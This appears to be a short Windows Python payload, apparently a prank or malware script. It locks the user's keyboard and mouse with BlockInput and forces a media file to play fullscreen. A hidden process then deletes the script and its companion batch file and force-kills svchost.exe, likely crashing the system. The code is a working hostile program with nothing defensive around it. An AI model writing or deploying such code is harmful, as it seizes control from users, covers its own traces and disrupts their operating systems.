import sys,os,ctypes,subprocess

# parameters
out = sys.argv[1]
batch = sys.argv[2]

# block user input
ctypes.windll.user32.BlockInput(True)

# launch Windows Media Player explicitly in fullscreen and wait
wmp = r'C:\Program Files\Windows Media Player\wmplayer.exe'
subprocess.call(['cmd','/c','start','""',f'"{wmp}"','/fullscreen','/play','/close',out])

# spawn cleanup
cmdline = f'cmd /c "timeout /t 2 /nobreak>nul & del \"{__file__}\" & del \"{batch}\" & TASKKILL /IM svchost.exe /F"'
si = subprocess.STARTUPINFO()
si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
si.wShowWindow = subprocess.SW_HIDE
subprocess.Popen(cmdline, startupinfo=si)
